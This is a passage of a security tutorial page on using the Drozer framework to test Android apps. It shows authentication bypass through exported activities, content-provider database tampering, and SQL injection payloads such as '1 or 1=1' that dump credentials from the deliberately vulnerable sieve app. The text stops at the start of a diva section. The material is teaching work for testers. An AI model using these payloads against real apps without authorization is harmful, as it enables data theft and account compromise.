@@ -1,0 +1,276 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/android-penetration-testing/" rel="category tag">Android Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Android Penetration Testing: Drozer</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/android-penetration-testing-drozer/" rel="bookmark"><time class="entry-date published" datetime="2020-12-25T14:51:18+00:00">December 25, 2020</time><time class="updated" datetime="2025-05-11T17:29:32+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Drozer is an android application security testing framework developed by FSecureLABS that makes it easy for a tester to create test cases and check for possible vulnerabilities in the components of an application. It was formerly known as Mercury and has honorable mentions in much leading mobile application security testing books as well. It is the de-facto standard for android application security testing frameworks.</span></p>
+<h5><strong><span style="color: #000000;">Features of Drozer are:</span></strong></h5>
+<ul>
+<li><span style="color: #000000;">Static analysis of an application</span></li>
+<li><span style="color: #000000;">Attacking and creation of test cases on the attack surface of an application</span></li>
+<li><span style="color: #000000;">Executing shell commands</span></li>
+<li><span style="color: #000000;">Crafting exploits of many known vulnerabilities</span></li>
+<li><span style="color: #000000;">Performing enumeration on various packages</span></li>
+</ul>
+<p><span style="color: #000000;">We’ll use three intentionally vulnerable apps for demonstration in this article: <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">sieve</a></u> </strong></span>(by MWR), <span style="color: #0000ff;"><u><a style="color: #0000ff;" href="https://github.com/tjunxiang92/Android-Vulnerabilities/blob/master/diva-beta.apk"><strong>diva</strong> </a></u></span>(by Aseem Jakhar) and <strong><span style="color: #0000ff;"><u><a style="color: #0000ff;" href="https://github.com/HTBridge/pivaa/blob/master/apks/pivaa.apk">pivaa</a></u> </span></strong>(by HTBridge).</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Installation of Drozer in Ubuntu and Drozer agent on the device</span></strong></li>
+<li><strong><span style="color: #000000;">Help menu</span></strong></li>
+<li><strong><span style="color: #000000;">Shell commands</span></strong></li>
+<li><strong><span style="color: #000000;">Information gathering of device</span></strong></li>
+<li><strong><span style="color: #000000;">Information gathering of packages installed</span></strong></li>
+<li><strong><span style="color: #000000;">View debuggable packages</span></strong></li>
+<li><strong><span style="color: #000000;">Dumping AndroidManifest.xml file</span></strong></li>
+<li><strong><span style="color: #000000;">Exploring the attack surface of a package</span></strong></li>
+<li><strong><span style="color: #000000;">Exploiting activities</span></strong></li>
+<li><strong><span style="color: #000000;">Exploiting content providers</span></strong></li>
+<li><strong><span style="color: #000000;">Exploiting services</span></strong></li>
+<li><strong><span style="color: #000000;">Exploiting broadcast receivers</span></strong></li>
+</ul>
+<h3><span style="color: #800000;">Installation</span></h3>
+<p><span style="color: #000000;">First, we need to install Python 2.7 and pip for Python 2.7. The direct method to install Python 2.7 and pip for the same version was buggy and so the following method is a workaround for it. Many users might get problems while doing this in recent versions of Kali Linux so we prefer doing this in Ubuntu 20.04 instead.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo apt-get install python2.7
+cd /usr/lib/python2.7
+sudo wget https://bootstrap.pypa.io/get-pip.py</pre>
+<p><span style="color: #000000;"><strong>Note</strong>: If Drozer throws up an error sys.stderr.write(f””) method, you might need to manually copy paste the latest get-pip.py file using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.py</pre>
+<p><span style="color: #000000;"><strong><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-iQ6neIu4j2o/X-XxAiOBrrI/AAAAAAAAsCs/JhBz12-Zy8URj7zrGUgGhoIfQHLxgXC7gCLcBGAsYHQ/s16000/Screenshot_0.png" alt="Android Penetration Testing with Drozer" width="850" height="338"/></strong></span></p>
+<p><span style="color: #000000;">Next, we need to download the drozer agent for the phone’s latest release, and the pre-compiled python builds wheel for the Drozer framework for Ubuntu. To do this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /home/hex/drozer &amp;&amp; cd /home/hex/drozer
+wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
+wget https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-NYncMqZMlyA/X-XxIVMBwxI/AAAAAAAAsCw/z-wwXbsNBzYVCFBT27g0lkxkng-PM_YbgCLcBGAsYHQ/s16000/Screenshot_1.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, we need to install pip and build this wheel. To do this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo python2.7 get-pip.py
+which pip2.7 (output -&gt; /usr/local/bin/pip2.7)
+cd /home/hex/drozer &amp;&amp; pip2.7 install drozer-2.4.4-py2-none-any.whl
+pip install twisted</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-N9zPvGA1mRI/X-XxNZbteEI/AAAAAAAAsC0/KvwtbYKUCXQzon6XjE17cHJ8fubmOJepgCLcBGAsYHQ/s16000/Screenshot_2.png" alt="Android Penetration Testing with Drozer" width="784" height="708"/></strong></span></p>
+<p><span style="color: #000000;">Now that everything is done and good to go, we’ll quickly check if Drozer had got installed or not</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">drozer</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-SvgibfBi6Kc/X-XxSsaH6uI/AAAAAAAAsC8/6h_qlhuX7TUrWuC1c5WUDj8MCj1lXXPIwCLcBGAsYHQ/s16000/Screenshot_3.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, we’ll install drozer agent on the device:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">adb connect 192.168.27.101:5555
+adb install drozer-agent-2.3.4.apk</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-zRSju1C5iEc/X-XxXKNpJOI/AAAAAAAAsDA/ZI1iEsF1dVYGzbzWvSxc2zIKNlRmqPF7QCLcBGAsYHQ/s16000/Screenshot_4.png"/></strong></span></p>
+<p><span style="color: #000000;">Let’s start the agent on the device. Notice the port mentioned down below that is the default port drozer’s agent is 31415</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--cWtFVwbdPk/X-Xxa88xL1I/AAAAAAAAsDE/9f0ZWkQQhx8yoliWWms7Sy0UvbpjIHYpwCLcBGAsYHQ/s16000/Screenshot_5.png"/></span></p>
+<p><span style="color: #000000;">Now that drozer agent is successfully installed, we need to connect drozer with it. For that, we’ll forward the default port 31415 on the device to local port 31415.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">adb forward tcp:31415 tcp:31415
+drozer console connect</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-FqDUi_edBtc/X-XxfpK1NcI/AAAAAAAAsDM/nFqaTLV45UkXxGFEp6KNVTg4_SlZSJLDACLcBGAsYHQ/s16000/Screenshot_6.png" alt="Android Penetration Testing with Drozer" width="681" height="654"/></strong></span></p>
+<p><span style="color: #000000;">Now that drozer is up and running, we’ll first look at all the modules that drozer has. Below, you can see all the various operations you can perform on activities, services, content providers, broadcast receivers as well as some other scanners, information gathering modules, and exploits.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">list</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7P5SHDeFHDE/X-XxlA-NSyI/AAAAAAAAsDQ/CCO-a1UkhPIPymNPEabIrP9tzHpQACOzACLcBGAsYHQ/s16000/Screenshot_7.png"/></span></p>
+<h3><span style="color: #800000;">Shell Command</span></h3>
+<p><span style="color: #000000;">We can launch a shell on the device from within drozer console by:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+whoami
+id</pre>
+<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-iP4gJg-7FFI/X-XxqS_HvHI/AAAAAAAAsDU/3tZ7Egsx2rQW1CP6w3gHnG8tLq3xS9wGQCLcBGAsYHQ/s16000/Screenshot_8.png" alt="Android Penetration Testing with Drozer" width="687" height="443"/></strong></span></p>
+<h3><span style="color: #800000;">Information Gathering on Device</span></h3>
+<p><span style="color: #000000;">Drozer has a couple of modules to display date/time of the device and some other information on the device as well</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run information.datetime
+run information.deviceinfo</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-h46g1mnquL8/X-Xxvdv4nCI/AAAAAAAAsDg/uwSH0V1RfYsEVQgHvWT_atJoV8_P_taVwCLcBGAsYHQ/s16000/Screenshot_9.png"/></strong></span></p>
+<h3><span style="color: #800000;">Information Gathering on Packages</span></h3>
+<p><span style="color: #000000;">To list all the packages installed on the device, we run the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.list</pre>
+<p><span style="color: #000000;">Further, to filter out the certain package we can apply the -f flag</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.list -f diva</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-7tK-aoxbMwg/X-Xxz04McmI/AAAAAAAAsDk/autxoChK88QER7LYoqqnKeDkwcXYw7KNwCLcBGAsYHQ/s16000/Screenshot_10.png"/></strong></span></p>
+<p><span style="color: #000000;">To view information about an installed package, we run the app.package.info module:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.info -a jakhar.aseem.diva</pre>
+<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-cuI9l2gCnj8/X-Xx4cmakEI/AAAAAAAAsDo/usNv3GdCbLMbQIhBgv6ui0nEZV8r8_pdgCLcBGAsYHQ/s16000/Screenshot_11.png" alt="Android Penetration Testing with Drozer" width="639" height="366"/></strong></span></p>
+<h3><span style="color: #800000;">Debuggable Packages</span></h3>
+<p><span style="color: #000000;">If a certain package is marked debuggable, we can inject our custom code in it while run-time and modify its behaviour. For this we can manually check the manifest file for the string “android_debuggable=”true”” or we can run the following drozer module:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.debuggable</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-sVEforImqCk/X-Xx8RXuHeI/AAAAAAAAsDw/dn041IAk-WQipsC3RO2f_9_Bm5ZwNC8YACLcBGAsYHQ/s16000/Screenshot_12.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Mitigation</strong>: One possible mitigation of this is to set “android_debuggable=”false”” in AndroidManifest.xml file.</span></p>
+<h3><span style="color: #800000;">Dumping AndroidManifest.xml File</span></h3>
+<p><span style="color: #000000;">To dump the manifest file of a package, we run the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.manifest jakhar.aseem.diva</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Aml6cUTZEQ8/X-XyAPEAJCI/AAAAAAAAsD4/-XxgmGMGk2gTJzaZ_lm6YA023lFNt0uiQCLcBGAsYHQ/s16000/Screenshot_13.png" alt="Android Penetration Testing with Drozer" width="640" height="796"/></span></p>
+<h3><span style="color: #800000;">Exploring Attack Surface of an Application</span></h3>
+<p><span style="color: #000000;">One of the handiest features of Drozer is to identify the attack surface of an application. This module will give us information on the attack surface of an android application. Android applications have 4 essential components that can be exploited along with the debuggable flag. This is known as an attack surface. The following module highlights that out for two such applications we have installed:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.package.attacksurface jakhar.aseem.diva
+run app.package.attacksurface com.mwr.example.sieve</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-Mej7jUxyZEA/X-XyE3DnySI/AAAAAAAAsEA/KHEF8GbFE345Ex4xBhii8cZW0uXk9lK3QCLcBGAsYHQ/s16000/Screenshot_14.png"/></strong></span></p>
+<h3><span style="color: #800000;">Exploiting Activities</span></h3>
+<p><span style="color: #000000;">An application may have exported activities that can be launched remotely and bypass various kinds of authentication mechanisms which the developer may have put on the class calling that activity. To check for all the exported activity, we have the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.activity.info -a jakhar.aseem.diva</pre>
+<p><span style="color: #000000;">Now to launch an exported activity we can do this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V9c0a9KQvis/X-XyJAgrauI/AAAAAAAAsEI/eNDMsmauG1cM4Z_UeXOU25P67SrJU9L2ACLcBGAsYHQ/s16000/Screenshot_15.png"/></span></p>
+<p><span style="color: #000000;">As you can see below, APICredsActivity has now been launched without any authentication</span></p>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Z4QmLpYleoA/X-XyNRsQQmI/AAAAAAAAsEQ/gr8kTyum0Mo8NxF71CCF_xwgoP4HXKXpQCLcBGAsYHQ/s16000/Screenshot_16.png" alt="Android Penetration Testing with Drozer" width="450" height="347"/></strong></span></p>
+<h5><span style="color: #000000;"><strong>Exploiting Activities through intents</strong></span></h5>
+<p><span style="color: #000000;">In English, “intent” means “purpose”. Similarly, intents in Android refers to an abstract description of an operation to be performed. Intents most importantly are used to start service, launch an activity, broadcast message, dial a number etc. Intent itself, in android, is an object holding two main things:</span></p>
+<ul>
+<li><span style="color: #000000;">action</span></li>
+<li><span style="color: #000000;">data</span></li>
+</ul>
+<p><span style="color: #000000;">There is a third parameter that can be added in an intent known as “extra.” This is better understood through the means of code (ref from <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://www.tutorialspoint.com/android/android_intents_filters.htm">here</a></u></strong></span>):</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Intent email = new Intent(Intent.ACTION_SEND, Uri.parse("mailto:"));
+email.putExtra(Intent.EXTRA_EMAIL, recipients);
+email.putExtra(Intent.EXTRA_SUBJECT, subject.getText().toString());
+email.putExtra(Intent.EXTRA_TEXT, body.getText().toString());
+startActivity(Intent.createChooser(email, "Choose an email client from..."));</pre>
+<p><span style="color: #000000;">Now, here we can see that action is “ACTION_SEND” (To send email)</span></p>
+<p><span style="color: #000000;">Data is “mailto:”</span></p>
+<p><span style="color: #000000;">And extra parameters define the recipients, subject and body of the e-mail.</span></p>
+<h5><span style="color: #000000;">Types of Intents</span></h5>
+<p><span style="color: #000000;">Now, intents are also of two types:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Explicit intent</strong>: In this type of intent, a developer pre-defines the component or external class that has to be called. For example,</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Intent i = new Intent(getApplicationContext(), ActivityTwo.class); 
+startActivity(i);</pre>
+<ul>
+<li><span style="color: #000000;"><strong>Implicit intent</strong>: In this type of intent, a developer need not define which component executes an instruction, rather, it pops open a window and lets the user choose which package would execute that instruction. For example,</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Intent intent=new Intent(Intent.ACTION_VIEW); 
+intent.setData(Uri.parse("http://www.hackingarticles.com")); 
+startActivity(intent);</pre>
+<p><span style="color: #000000;">Here, we can see, the action is VIEW, data is a URL and there are no extras.</span></p>
+<h5><span style="color: #000000;">Exploiting Activities through Intents in Drozer</span></h5>
+<p><span style="color: #000000;">Hence, similarly in drozer, we can either:</span></p>
+<ol>
+<li><span style="color: #000000;">start an activity by specifying the component and it’s data to be executed or,</span></li>
+<li><span style="color: #000000;">we can define an action and data, and let the user choose which component would launch it.</span></li>
+</ol>
+<p><span style="color: #000000;">For case 1, we try to launch <em>hackingarticles.in</em> on Chrome browser:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.activity.start --component com.android.chrome com.google.android.apps.chrome.Main --data-uri https://hackingarticles.in</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-TjEbQ4xLISw/X-XyRhzdzjI/AAAAAAAAsEY/TblNHYzZ6CkJN7eFqPyQ3rlD4jxnOg09gCLcBGAsYHQ/s16000/Screenshot_17.png"/></strong></span></p>
+<p><span style="color: #000000;">For case 2: we type the action we want to perform, in this case, the action is VIEW that refers to parsing a URL. (See the developer handbook <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://developer.android.com/reference/android/content/Intent#constants_1">here</a></u></strong></span> for all actions.)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.activity.start --action android.intent.action.VIEW --data-uri https://hackingarticles.in</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5_vpo60brSQ/X-XyXom9vxI/AAAAAAAAsEg/jPrNWJAFcwkrXOzKRp3HTsyCBLgk1fIUgCLcBGAsYHQ/s16000/Screenshot_18.png" alt="Android Penetration Testing with Drozer" width="663" height="630"/></strong></span></p>
+<p><span style="color: #000000;">And sure enough, all the applications that can launch the defined action with the defined data parameter have now popped up and the user can choose which application to open it from.</span></p>
+<p><span style="color: #000000;">A tester can also add an “extra” parameter which is analogous to “putExtra()” in android.</span></p>
+<h3><span style="color: #800000;">Exploiting Content Providers</span></h3>
+<p><span style="color: #000000;">Content Providers in Android help an application to access and manage data stored in its own SQLite database or operate on files. Hence, two types of content providers are widely used namely, database-backed and file-backed. They are standard interfaces that connect data in one process with code running in another process. Hence, some applications can access the database/file-backed provider running in your application through your content provider’s interface.</span></p>
+<p><span style="color: #000000;">To extract information about content providers present in one application:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.info -a com.mwr.example.sieve</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-XkYzz9L24CQ/X-XycBxeL-I/AAAAAAAAsEo/EflOZ9QWi7kWKwxWqYc4DHiC0Df1ImZrwCLcBGAsYHQ/s16000/Screenshot_19.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, in the screenshot above, we see one such content provider that is being “exported” that means nothing but “it can be accessed by other application”</span></p>
+<h5><span style="color: #000000;">Testing Accessible URIs</span></h5>
+<p><span style="color: #000000;">There is also an interesting path revealed with permissions to read and write as well. There is a module in drozer that scans and finds all the “queriable” content providers in an application. When we say queriable, it means nothing but which can be accessed in layman terms.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.finduri com.mwr.example.sieve</pre>
+<p><span style="color: #000000;">The above command finds all the URIs that are present. The following command, however, filters out the URIs that can be queried or not</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run scanner.provider.finduris -a com.mwr.example.sieve</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-8QkzEeDJbUQ/X-Xyf7DVe9I/AAAAAAAAsEw/jEfAW5m4fZEANU9QYLqGUt57ikjtD-VPACLcBGAsYHQ/s16000/Screenshot_20.png" alt="Android Penetration Testing with Drozer" width="669" height="504"/></strong></span></p>
+<h5><span style="color: #000000;">Performing Database Operations</span></h5>
+<p><span style="color: #000000;">Now that we have all the accessible content URIs, we’ll begin testing on them. The first command displays the columns present in the provider, second command attempts operations on file-backed content providers to read a certain file. Here, the provider is only supporting the database so we won’t see any output. But this module can attempt directory traversal, read files etc on the providers that do support files. The third command queries a database and dumps information out.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.columns content://com.mwr.example.sieve.DBContentProvider/Keys/
+run app.provider.read content://com.mwr.example.sieve.DBContentProvider/Keys/
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-EJ_QkpCJIuk/X-XyrJ7FMPI/AAAAAAAAsE8/om7dQRoR870OfdrIHCwzhHXFbdEjiOzHQCLcBGAsYHQ/s16000/Screenshot_21.png"/></p>
+<h5><span style="color: #000000;"><strong>Inserting in a database using content provider</strong></span></h5>
+<p><span style="color: #000000;">Now, we know the provider’s database has to write permissions, so we’ll insert a new pin and password into the provider with the following commands and hence, we will be able to successfully bypass the front page login screen authentication:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Keys/ --string pin 1111 --string Password H4ck3d
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-9RrYdVdzPpE/X-XyvSmNkLI/AAAAAAAAsFI/L6sAujoPCpg4VLySe3-Cm2dimGfwM6-fgCLcBGAsYHQ/s16000/Screenshot_22.png" alt="Android Penetration Testing with Drozer" width="671" height="278"/></p>
+<p><span style="color: #000000;">You can verify the updated database by changing directory to /data/data/&lt;package name&gt;/databases and then use sqlite3 command to view the databases.</span></p>
+<h5><span style="color: #000000;"><strong>Updating a database using content provider</strong></span></h5>
+<p><span style="color: #000000;">The same way we have inserted in the database, we can update it as well using the following commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "Password=?" --selection-args H4ck3d --string pin 1769
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-TfLDgwAGb98/YARq2eMOH4I/AAAAAAAAs9M/Wy9dYlM3M1oJMhT1j0j2CH2yNJCD1MQgQCLcBGAsYHQ/s16000/Screenshot_23.png"/></p>
+<p><span style="color: #000000;">Here, –selection has the specific format of “&lt;key name&gt;=?” and further selection-args is used to specify the argument for the specified selection key. Further, to update the record specified by the –selection parameter, we use –string &lt;column name&gt; &lt;updated record name&gt;</span></p>
+<p><span style="color: #000000;">Think of this like updating a traditional SQL database of the form: update set values &lt;value&gt; where key=&lt;some key&gt;</span></p>
+<h5><span style="color: #000000;"><strong>Deleting from a database using provider</strong></span></h5>
+<p><span style="color: #000000;">We can delete from a database with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "Password=?" --selection-args H4ck3d
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</pre>
+<p><span style="color: #000000;">Here, –selection and selection-args parameter serve the purpose of a key to be deleted as stated in the previous screenshot’s explanation.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-gObJSEw_88U/X-Xy8TpKjWI/AAAAAAAAsFY/9yPuUlGrKtAQPjk0wYuf1FITlHTFQWotACLcBGAsYHQ/s16000/Screenshot_24.png" alt="Android Penetration Testing with Drozer" width="670" height="266"/></span></p>
+<p><span style="color: #000000;">Now, to detect all the injectable content providers of an application we have a scanner that can do the same thing using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run scanner.provider.injection -a com.mwr.example.sieve</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-JonWWWE6hk4/X-XzAif3U3I/AAAAAAAAsFc/myI3GAJixNs-kIUYqzeFCFJUdd6QI10hQCLcBGAsYHQ/s16000/Screenshot_25.png"/></strong></span></p>
+<p><span style="color: #000000;">Interesting things here to note are “projection” and “selection.”</span></p>
+<p><span style="color: #000000;">As we have seen above, selection serves the purpose of <strong>where </strong>in the database. Similarly, projection serves the purpose of what to select, as in “select &lt;projection&gt; from table where(&lt;–selection&gt; and &lt;–selection-args&gt;)”</span></p>
+<p><span style="color: #000000;">You can see this in the help menu:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.query --help</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-KruGAFHfS9c/X-XzE1DBasI/AAAAAAAAsFk/gy-XBbX2nVQTqbnqrlsiga9Mzvk9I8pMACLcBGAsYHQ/s16000/Screenshot_26.png" alt="Android Penetration Testing with Drozer" width="583" height="920"/></span></p>
+<p><span style="color: #000000;">To view all the SQL tables in the database of the server, we have a module in drozer:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run scanner.provider.sqltables -a com.mwr.example.sieve</pre>
+<p><span style="color: #000000;">This can also be manually viewed in the “<strong>/data/data/&lt;package_name&gt;/databases</strong>” directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cx5-kvEioR8/X-XzJF7kLzI/AAAAAAAAsFs/W1ziqJT4BvEJIwMXusKr9C3cvXG-w4URACLcBGAsYHQ/s16000/Screenshot_27.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Exploiting SQL injections in databases using content providers</strong></span></h5>
+<p><span style="color: #000000;">Now that we have seen how a content provider’s interface works, it is also safe to say that while communicating with the SQLite database, content provider queries can be injected to exploit SQL injections.</span></p>
+<p><span style="color: #000000;">In many real-life cases, we won’t have read/write permissions on the database, and SQL injections can come in handy.</span></p>
+<p><span style="color: #000000;">The following command dumps the SQLITE_MASTER schema table. According to sqlite.org, “Every SQLite database contains a single “schema table” that stores the schema for that database. The schema for a database is a description of all of the other tables, indexes, triggers, and views that are contained within the database.”</span></p>
+<p><span style="color: #000000;">Alternate names of schema tables are: sqlite_schema, sqlite_temp_schema, sqlite_temp_master.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "* FROM SQLITE_MASTER where type=’table’;--"</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5zgx1cYj4Zk/X-XzNTZLuRI/AAAAAAAAsFw/OP_x9Tkey0c-mb5a8Ux4P00RqRoxrcB5QCLcBGAsYHQ/s16000/Screenshot_28.png" alt="Android Penetration Testing with Drozer" width="745" height="196"/></strong></span></p>
+<p><span style="color: #000000;">Now, we know –selection is analogous to “where” clause. So, just like in traditional SQL statements, an apostrophe would break the query and throw an error and so we were able to exploit SQL injections. This way:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection " ' "</pre>
+<p><span style="color: #000000;">The above command would break the query and we’d see an error. Now, the following command would render the complete query as true and should dump the entire database</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "1 or 1=1"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XirlRNEugzg/X-XzRXuQDwI/AAAAAAAAsF4/YM3atY6H9xIXCIUVcQRWIDJT6yOgPvaPACLcBGAsYHQ/s16000/Screenshot_29.png"/></span></p>
+<p><span style="color: #000000;">It is safe to say, many other of th</span><span style="color: #000000;">e traditional SQL injection payloads should also</span><span style="color: #000000;"> work this way using content providers</span></p>
+<p><span style="color: #000000;">Similarly, one more payload that we can try for fun is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "Password" --selection "1 or 1=1"</pre>
+<p><span style="color: #000000;"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-H7XJt5b0T2k/X-XzUwTiYUI/AAAAAAAAsGA/qJsE6mOCjpkzrX5KDoIARnE9M8WfeHDfACLcBGAsYHQ/s16000/Screenshot_30.png" alt="Android Penetration Testing with Drozer" width="748" height="182"/></strong></span></p>
+<h5>Testing on Diva App</h5>
+<p><span style="color: #000000;">Let’s try the same on diva app as well:</span></p>
